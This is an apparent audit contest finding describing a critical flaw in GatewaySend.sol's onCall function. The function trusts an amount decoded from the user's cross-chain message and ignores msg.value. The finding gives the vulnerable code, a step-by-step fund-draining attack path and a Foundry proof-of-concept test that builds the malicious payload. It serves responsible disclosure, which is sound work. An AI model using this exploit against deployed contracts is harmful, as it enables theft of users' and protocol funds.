# Attacker Can Drain All Funds from GatewaySend.sol

### Summary

A critical vulnerability exists in the `GatewaySend.sol` contract, enabling an attacker to drain the entirety of its token holdings. The contract's `onCall` function, which executes incoming cross-chain transactions, fundamentally misunderstands the ZetaChain trust model. It determines the value of a transfer or swap based on an `amount` field decoded from a user-submitted `message` payload, which is completely untrusted. The function should instead use trusted values passed by the ZetaChain Gateway or not allow arbitary values in the message while calling depositAndCall function. This flaw allows an attacker to deposit a trivial amount of a token while crafting a payload with a fraudulent, high amount, tricking the contract into paying out funds from its own liquidity pool.

###  Root Cause Analysis

The vulnerability is rooted in a fundamental misunderstanding of the trust model established by ZetaChain's `GatewayEVM.sol`.

#### 2.1. The `GatewayEVM` and `Callable` Interaction Model

On a standard EVM chain, application contracts like `GatewaySend.sol` interact with the ZetaChain protocol via the `GatewayEVM.sol` contract. When the ZetaChain network relays a transaction to the destination chain, it is the `GatewayEVM` that ultimately calls the target application contract.


This interaction follows a defined interface named `Callable`:
[Callable` Interface (`Zetachaincontracts/contracts/evm/interfaces/IGatewayEVM.sol)](https://github.com/zeta-chain/protocol-contracts/blob/main/contracts/evm/GatewayEVM.sol)
https://github.com/zeta-chain/protocol-contracts/blob/2e61e029e89792c1b10ed15d2aa19818a77dd4d8/contracts/evm/GatewayEVM.sol#L350C5-L367C6
```solidity
interface Callable {
    function onCall(MessageContext calldata context, bytes calldata message) external payable returns (bytes memory);
}
```

The key security feature for native asset transfers is the standard Solidity `payable` mechanism. When the `GatewayEVM` processes an incoming cross-chain ETH transfer, it calls the target contract's `onCall` function and forwards the exact, verified amount of ETH via `msg.value`. **This `msg.value` is the trusted, protocol-verified amount.** The `message` parameter, by contrast, is untrusted data supplied by the user who initiated the transaction.

#### 2.2. The Flaw in `GatewaySend.sol`

The [GatewaySend.sol](https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex/blob/main/omni-chain-contracts/contracts/GatewaySend.sol#L347) contract correctly implements the `Callable` interface signature, but its internal logic is fatally flawed. It completely ignores `msg.value` and instead trusts the data it decodes from the `message` payload.

**Vulnerable Code (`omni-chain-contracts/contracts/GatewaySend.sol`):**
```solidity
function onCall(
    MessageContext calldata /*context*/,
    bytes calldata message
) external payable onlyGateway returns (bytes4) {
    (
        bytes32 externalId,
        uint256 amount, // <-- THIS AMOUNT IS DECODED FROM THE UNTRUSTED `message`
        bytes calldata recipient,
        address fromToken,
        address toToken,
        bytes calldata swapData
    ) = decodePackedMessage(message);

    bool fromIsETH = (fromToken == _ETH_ADDRESS_);
    address evmWalletAddress = address(bytes20(recipient));

    uint256 outputAmount;
    if(fromToken == toToken) {
        // Here, if fromToken is ETH, `outputAmount` is set to the fraudulent `amount`.
        // The trusted `msg.value` is ignored.
        outputAmount = amount;
    } else {
        // The swap path is also vulnerable.
        outputAmount = _doMixSwap(swapData);
    }
```
https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex/blob/main/omni-chain-contracts/contracts/GatewaySend.sol#L345C1-L353C1

When an attacker sets `fromToken` and `toToken` to the ETH address, `outputAmount` is assigned the value of the fraudulent `amount` from the payload. The subsequent `transfer` call then sends ETH from the contract's own balance, not the ETH that was just delivered in the transaction.

A secondary, related flaw exists in the `_doMixSwap` function, which also decodes the swap amount from the user-provided `swapData`, creating a similar vulnerability for ERC20 swaps.

### 3. Attack Scenario

#### Internal Preconditions

*   The `GatewaySend.sol` contract must hold a balance of ETH. This liquidity could be from protocol-owned funds or an accumulation of other users' funds from previously failed or reverted transactions.

#### External Preconditions

*   The attacker must have the ability to initiate a cross-chain transaction through ZetaChain, which is a public and permissionless operation.

####  Attack Path

1.  An attacker scans the blockchain and finds that the `GatewaySend.sol` contract holds a balance of 50 ETH.

2.  **Payload Construction:** The attacker uses an off-chain script to craft a malicious `message` payload by ABI-encoding the following values:
    *   `externalId`: any `bytes32` value
    *   `outputAmount`: `50 * 10^18` (the 50 ETH to be stolen)
    *   `receiver`: The attacker's wallet address
    *   `fromToken`: The ETH address (`0xE...E`)
    *   `toToken`: The ETH address (`0xE...E`)
    *   `swapDataB`: empty `bytes`

3.  **Transaction Initiation (Source Chain):** The attacker calls `depositAndCall` on the source chain's `GatewayEVM.sol` contract, providing a trivial deposit of **0.001 ETH** and the malicious `message` payload.

4.  **ZetaChain Processing:** The ZetaChain network validates the transaction (a 0.001 ETH deposit) and instructs the `GatewayEVM` on the destination chain to execute the call.

5.  **Exploitation (Destination Chain):**
    *   The ZetaChain TSS calls the destination `GatewayEVM.execute` function, which forwards the **0.001 ETH** as `msg.value`.
    *   The `GatewayEVM` then calls `GatewaySend.sol`'s `onCall` function. Crucially, `msg.value` inside `onCall` is now **0.001 ETH**.
    *   The `onCall` function **ignores `msg.value`**.
    *   `decodePackedMessage` executes and extracts the fraudulent `amount` of **50 ETH** from the payload.
    *   Because `fromToken == toToken`, `outputAmount` is set to 50 ETH.
    *   The final transfer, `payable(evmWalletAddress).transfer(outputAmount)`, sends **50 ETH** from the contract's own liquidity pool to the attacker.

6.  **Result:** The attacker drains 50 ETH from the contract at the minimal cost of 0.001 ETH and gas fees.



### 4. Impact

The impact is **Critical**. This vulnerability allows for the complete and irreversible theft of the contract's entire native token (ETH) balance. The exploit is simple, requires no special permissions, and can be repeated until the contract is financially depleted, posing an existential risk to the protocol's funds managed by this contract.

import "./BaseTest.t.sol";
import "forge-std/console.sol";

contract GatewaySendPOCTest is BaseTest {
    function setUp() public override {
        super.setUp();
        vm.deal(address(gatewaySendB), 50 ether);
    }

    function test_EthDrainVulnerability() public {
        address attacker = address(0x999);
        uint256 actualDepositAmount = 0.001 ether;
        uint256 claimedAmount = 50 ether;
        
        uint256 contractBalanceBefore = address(gatewaySendB).balance;
        uint256 attackerBalanceBefore = attacker.balance;
        
        console.log("=== BEFORE ATTACK ===");
        console.log("Contract ETH balance:", contractBalanceBefore);
        console.log("Attacker ETH balance:", attackerBalanceBefore);
        console.log("Actual deposit amount:", actualDepositAmount);
        console.log("Claimed amount in message:", claimedAmount);
        
        bytes32 externalId = keccak256("malicious_tx");
        bytes memory recipient = abi.encodePacked(attacker);
        address fromToken = _ETH_ADDRESS_;
        address toToken = _ETH_ADDRESS_;
        bytes memory swapData = "";
        
        bytes memory maliciousMessage = _encodeMaliciousMessage(
            externalId,
            claimedAmount,
            recipient,
            fromToken,
            toToken,
            swapData
        );
        
        vm.startPrank(address(gatewayB));
        
        gatewaySendB.onCall{value: actualDepositAmount}(
            MessageContext({sender: attacker}),
            maliciousMessage
        );
        
        vm.stopPrank();
        
        uint256 contractBalanceAfter = address(gatewaySendB).balance;
        uint256 attackerBalanceAfter = attacker.balance;
        
        assertEq(
            contractBalanceBefore - contractBalanceAfter, 
            claimedAmount, 
            "Contract should have lost the claimed amount"
        );
        
        assertEq(
            attackerBalanceAfter - attackerBalanceBefore, 
            claimedAmount, 
            "Attacker should have gained the claimed amount"
        );
        
        assertGt(
            attackerBalanceAfter - attackerBalanceBefore,
            actualDepositAmount,
            "Attacker gained more ETH than they deposited - vulnerability confirmed!"
        );
    }


    function _encodeMaliciousMessage(
        bytes32 externalId,
        uint256 fraudulentAmount,
        bytes memory recipient,
        address fromToken,
        address toToken,
        bytes memory swapData
    ) internal pure returns (bytes memory) {
        bytes memory crossChainData = abi.encodePacked(
            fromToken,
            toToken,
            swapData
        );
        
        return abi.encodePacked(
            externalId,
            bytes32(fraudulentAmount),
            uint16(recipient.length),
            uint16(crossChainData.length),
            recipient,
            crossChainData
        );
    }
}
